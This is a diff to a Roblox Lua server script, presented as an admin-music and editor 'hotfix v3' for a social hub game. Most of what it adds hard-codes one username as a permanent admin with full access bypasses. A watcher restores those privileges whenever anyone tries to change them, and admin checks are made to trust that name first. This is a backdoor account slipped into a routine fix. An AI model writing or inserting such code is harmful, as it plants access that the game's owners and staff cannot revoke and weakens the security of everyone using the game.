@@ -1,10 +1,63 @@
--- BBYA SOCIAL HUB — ADMIN NEXT + EDITOR HOTFIX v2
+-- BBYA SOCIAL HUB — ADMIN NEXT + EDITOR HOTFIX v3
 -- Makes admin NEXT effective for primary AutoDJ and recovery/fallback audio.
 -- Runtime editor stays hidden by default; authorized admins can still toggle it with /bbyaedit.
+-- v3 hard-locks developer account arda_moron123 as static ADMIN with full travel/access bypass.
 
 local Players=game:GetService("Players")
 local ReplicatedStorage=game:GetService("ReplicatedStorage")
 local SoundService=game:GetService("SoundService")
+
+local STATIC_ADMIN_USERNAMES={
+ ["arda_moron123"]=true,
+}
+
+local function usernameKey(player)
+ return player and string.lower(player.Name) or ""
+end
+
+local function isStaticAdmin(player)
+ return player and STATIC_ADMIN_USERNAMES[usernameKey(player)]==true
+end
+
+local function grantStaticAdminAccess(player)
+ if not isStaticAdmin(player) then return end
+ player:SetAttribute("BBYAManagedRole","ADMIN")
+ player:SetAttribute("BBYAAdmin",true)
+ player:SetAttribute("BBYAStaff",true)
+ player:SetAttribute("BBYAVIPBypass",true)
+ player:SetAttribute("BBYARooftopBypass",true)
+ player:SetAttribute("BBYASecretRoomBypass",true)
+ player:SetAttribute("BBYATravelBypass",true)
+end
+
+local function bindStaticAdmin(player)
+ if not isStaticAdmin(player) then return end
+ grantStaticAdminAccess(player)
+ local watched={
+  BBYAManagedRole="ADMIN",
+  BBYAAdmin=true,
+  BBYAStaff=true,
+  BBYAVIPBypass=true,
+  BBYARooftopBypass=true,
+  BBYASecretRoomBypass=true,
+  BBYATravelBypass=true,
+ }
+ for attribute,expected in pairs(watched) do
+  player:GetAttributeChangedSignal(attribute):Connect(function()
+   if player.Parent and player:GetAttribute(attribute)~=expected then
+    task.defer(function()
+     if player.Parent then grantStaticAdminAccess(player) end
+    end)
+   end
+  end)
+ end
+ task.delay(3,function()
+  if player.Parent then grantStaticAdminAccess(player) end
+ end)
+end
+
+for _,p in ipairs(Players:GetPlayers()) do bindStaticAdmin(p) end
+Players.PlayerAdded:Connect(bindStaticAdmin)
 
 local remotes=ReplicatedStorage:WaitForChild("BBYAClubRemotes",30)
 if not remotes then return end
@@ -15,6 +68,7 @@ local basementMusic=remotes:FindFirstChild("BasementMusic")
 
 local function isAdmin(player)
  if not player then return false end
+ if isStaticAdmin(player) then return true end
  if player:GetAttribute("BBYAAdmin")==true then return true end
  return game.CreatorType==Enum.CreatorType.User and player.UserId==game.CreatorId
 end
@@ -88,4 +142,4 @@ musicRemote.OnServerEvent:Connect(function(player,action)
  toast(player,"NEXT • skip diproses")
 end)
 
-print("[BBYA] Admin NEXT + editor hotfix v2 online: EDIT hidden by default; /bbyaedit preserved")
+print("[BBYA] Admin NEXT + editor hotfix v3 online: arda_moron123 static ADMIN + full bypass; EDIT hidden by default; /bbyaedit preserved")
